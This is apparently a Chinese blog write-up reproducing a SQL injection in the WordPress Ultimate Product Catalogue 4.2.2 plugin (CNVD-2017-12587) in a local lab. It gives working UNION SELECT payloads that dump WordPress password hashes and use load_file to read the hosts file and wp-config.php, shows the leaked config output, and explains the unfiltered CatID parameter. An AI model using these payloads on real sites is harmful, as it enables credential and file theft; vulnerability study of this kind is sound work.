---
layout: post
title: "CNVD-2017-12587(WordPress Ultimate Product Catalogue 4.2.2 插件SQL注入漏洞)"
description: ""
date: 2023-07-11
categories:
  - CVE
  - WordPress
author: ""
tags: ['CVE', 'WordPress', 'SQL_Injection']
---



# CNVD-2017-12587(WordPress Ultimate Product Catalogue 4.2.2 插件SQL注入漏洞)

###### tags: `CVE` `wordpress`




環境:
win7
mamp (apache + mysql)
wordpress 創建一個一般使用者

漏洞插件:
WordPress Ultimate Product Catalogue 4.2.2






## 一些坑:


mysql.ini 加上 secure_file_priv=

詳細說明:
https://blog.51cto.com/u_15162069/2742169

```
[mysqld] 
secure_file_priv=
```

### mysql load_file:
```mysql=

show global variables like '%secure%';


//測試
select load_file('D:/123.txt');


//有時打印不出來，需要轉成hex 
//D:/123.txt => 443a2f3132332e747874
select load_file(0x443a2f3132332e747874);


```



### 安裝插件:記得用.zip檔案安裝



## POC

## url:
```
//需要在使用者登入狀態下使用
http://localhost/wp-admin/admin-ajax.php?action=get_upcp_subcategories
```


## post payload:
```

CatID=0 UNION SELECT user_login,user_pass FROM wp_users WHERE ID=1




CatID=0 UNION SELECT 1,user()




//印出:\Windows\System32\drivers\etc\hosts
//C:\Windows\System32\drivers\etc\hosts
//to hex
//433a5c57696e646f77735c53797374656d33325c647269766572735c6574635c686f737473

CatID=0 UNION SELECT 1,load_file(0x433a5c57696e646f77735c53797374656d33325c647269766572735c6574635c686f737473);



```



### 印出 wordpress\wp-config.php 
前提是你需要知道絕對路徑:
ex:D:\123.txt

回傳的代碼需要自己排版一下
```
//方法同上


response:


<!--?php
/**
 * WordPress基础配置文件。
 *
 * 这个文件被安装程序用于自动生成wp-config.php配置文件，
 * 您可以不使用网站，您需要手动复制这个文件，
 * 并重命名为“wp-config.php”，然后填入相关信息。
 *
 * 本文件包含以下配置选项：
 *
 * * MySQL设置
 * * 密钥
 * * 数据库表名前缀
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/zh-cn:%E7%BC%96%E8%BE%91_wp-config.php
 *
 * @package WordPress
 */

// ** MySQL 设置 - 具体信息来自您正在使用的主机 ** //
/** WordPress数据库的名称 */
define('DB_NAME', 'wordpress');

/** MySQL数据库用户名 */
define('DB_USER', 'root');

/** MySQL数据库密码 */
define('DB_PASSWORD', 'root');

/** MySQL主机 */
define('DB_HOST', 'localhost');

/** 创建数据表时默认的文字编码 */
define('DB_CHARSET', 'utf8mb4');

/** 数据库整理类型。如不确定请勿更改 */
define('DB_COLLATE', '');

/**#@+
 * 身份认证密钥与盐。
 *
 * 修改为任意独一无二的字串！
 * 或者直接访问{@link https://api.wordpress.org/secret-key/1.1/salt/
 * WordPress.org密钥生成服务}
 * 任何修改都会导致所有cookies失效，所有用户将必须重新登录。
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'Q(-->Zqw%jyM&amp;JAlE(DOqk3YfY/U4c=H=Ca,n:r&gt;)U!V#6y[]fd@A9b]~zrye3:D7=');
define('SECURE_AUTH_KEY',  '(C+3WwICt[<qqc7}))[crwg rrc_aiyxfjag:j.)yorge@by="" o?ah|%[uy{bkahh');="" define('logged_in_key',="" '{3rrjcrx2ok;gq8kzm;;e-x$93p6~bai_na-bo:y&bk|f2uzwhzw(&gq_lje^1&~');="" define('nonce_key',="" '="y}#.g7zSP1]b2`~cK.`_(Q@ZzGu">@vD#T2^{|ipp&amp;I0reP_N-RWI)a5*^/^!k7&amp;');
define('AUTH_SALT',        'I=HF^3_Oly6(HV8@RS7A,Oe7Vt)dMtnc.Lb;?T0e$:O;PJt4#SeD^?uxa1bs;@5E');
define('SECURE_AUTH_SALT', 'FxR/L]=][Y{I9)7p@[EP?`Qi}t~zY]i:`oV:H4`&amp;]+nOk_FhFA}OSpM((hr4ho@E');
define('LOGGED_IN_SALT',   '_m3]4zfmI8X%r.{Cx=jx&lt;&amp;1TMog|mk=VI9va!(qM)4|K:2yX}E-N$]gf8w@|ixCd');
define('NONCE_SALT',       'lrW}m#j0N+|An{:Hc]W%c0~}*v6x&gt;sSg3wzwzP9$WvO7{E[0^)U+myD!#hu&amp;C2]`');

/**#@-*/

/**
 * WordPress数据表前缀。
 *
 * 如果您有在同一数据库内安装多个WordPress的需求，请为每个WordPress设置
 * 不同的数据表前缀。前缀名只能为数字、字母加下划线。
 */
$table_prefix  = 'wp_';

/**
 * 开发者专用：WordPress调试模式。
 *
 * 将这个值改为true，WordPress将显示所有用于开发的提示。
 * 强烈建议插件开发者在开发环境中启用WP_DEBUG。
 *
 * 要获取其他能用于调试的信息，请访问Codex。
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */
define('WP_DEBUG', false);

/**
 * zh_CN本地化设置：启用ICP备案号显示
 *
 * 可在设置→常规中修改。
 * 如需禁用，请移除或注释掉本行。
 */
define('WP_ZH_CN_ICP_NUM', true);

/* 好了！请不要再继续编辑。请保存本文件。使用愉快！ */

/** WordPress目录的绝对路径。 */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** 设置WordPress变量和包含文件。 */
require_once(ABSPATH . 'wp-settings.php');
0</qqc7}))[crwg></body>


```

總之 sql 注入可以弄很多東西。






## 分析


wp-content/plugins/ultimate-product-catalogue/Functions/Process_Ajax.php
```PHP=
function Get_UPCP_SubCategories() {
	global $subcategories_table_name;
	$Path = ABSPATH . 'wp-load.php';
	include_once($Path);
	global $wpdb;
	
	$SubCategories = $wpdb->get_results("SELECT SubCategory_ID, SubCategory_Name FROM $subcategories_table_name WHERE Category_ID=" . $_POST['CatID']);
	foreach ($SubCategories as $SubCategory) {$Response_Array[] = $SubCategory->SubCategory_ID; $Response_Array[] = $SubCategory->SubCategory_Name;}
	if (is_array($Response_Array)) {$Response = implode(",", $Response_Array);}
	else {$Response = "";}
	echo $Response;
}
```


$_POST['CatID'] 沒過濾

```SQL=
$SubCategories = $wpdb->get_results("SELECT SubCategory_ID, SubCategory_Name FROM $subcategories_table_name WHERE Category_ID=" . $_POST['CatID']);
```





這題太簡單了，輕鬆一下。












































